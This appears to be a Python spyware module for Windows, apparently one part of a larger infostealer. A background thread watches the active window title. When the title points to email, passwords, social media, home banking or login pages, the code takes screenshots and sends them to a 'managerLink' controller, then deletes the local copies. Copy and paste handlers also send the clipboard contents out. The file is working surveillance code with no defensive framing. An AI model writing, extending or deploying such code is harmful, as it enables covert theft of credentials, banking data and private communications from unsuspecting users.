from multiprocessing.resource_tracker import getfd
import threading
from ctypes import windll, create_unicode_buffer
from time import sleep, time
from PIL import ImageGrab
from tkinter import Tk
from os.path import expanduser, join as pathjoin
from os import remove as removefile

# from main_moduli import Manager

class ContextGrabber(threading.Thread):
  def __init__(self, sleep_interval=1):
    super(ContextGrabber, self).__init__()
    self._kill = threading.Event()
    self._interval = sleep_interval
    self.resourcePath = expanduser("~")
    self.tk = None
    self.managerLink = None

  def run (self):
    sleep(1)
    while True:
      self.tick()

      # If no kill signal is set, sleep for the interval,
      # If kill signal comes in while sleeping, immediately
      #  wake up and handle
      is_killed = self._kill.wait(self._interval)
      if is_killed:
        break
  
  def kill(self):
    self._kill.set()

  def saveFullScreenshot (self):
    im = ImageGrab.grab() # (bbox=(x1, y1, x2, y2))
    # pix = im.load()
    # for x in range(im.size[0]):
    #    for y in range(im.size[1]):
    #        if pix[x, y] != (254, 254, 254):
    #            pix[x, y] = 0
    imgpath = pathjoin(self.resourcePath, f"MySnapshot_{time()}.jpg")
    save_path = imgpath
    im.save(save_path)
    return imgpath

  def getForegroundWindowTitle (self):
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
    
    if buf.value:
      return buf.value
    else:
      return None

  def isInterestingWindow (self, title: str):
    if not title: return False
    title = title.lower()
    # if 'chrome' in title: return 'Chrome'
    # if 'edge' in title: return 'Edge'
    # if 'opera' in title: return 'Opera'
    # if 'firefox' in title: return 'Firefox'
    if 'mail' in title: return True
    if 'posta' in title: return True
    if 'password' in title: return True
    # if 'telegram' in title: return True
    if 'facebook' in title: return True
    if 'twitter' in title: return True
    if 'home banking' in title: return True
    if 'homebanking' in title: return True
    if 'login' in title: return True
    if 'registration' in title: return True
    return False

  def getForegroundTitleIfInteresting (self):
    title = self.getForegroundWindowTitle()
    return self.isInterestingWindow(title) and title or None
  
  def tick (self):
    title = self.getForegroundTitleIfInteresting()
    if title:
      self.makeAndSendScreenshot(title)
    else:
      pass
  
  def makeAndSendScreenshot (self, title=None):
    if self.managerLink:
      path = self.saveFullScreenshot()
      if not title:
        title = self.getForegroundWindowTitle() or "-no active window-"
      self.managerLink.sendTextMessage('OPENED WINDOW: ' + title)
      self.managerLink.sendImageMessage(path)
      try:
        removefile(path)
      except:
        pass

  def onCopyEvent (self):
    sleep(0.2)
    self.managerLink.sendTextMessage('COPY EVENT')
    self.sendClipboard()
    self.makeAndSendScreenshot()
  
  def onPasteEvent (self):
    sleep(0.2)
    self.managerLink.sendTextMessage('PASTE EVENT')
    self.sendClipboard()
    self.makeAndSendScreenshot()
  
  def sendClipboard (self):
    if not self.tk:
      self.tk = Tk()
    clip = self.tk.clipboard_get()
    self.managerLink.sendTextMessage('FROM CLIPBOARD\n' + clip)

if __name__ == '__main__':
  cg = ContextGrabber(sleep_interval=5)
  cg.run()
  sleep(60)
  cg.kill()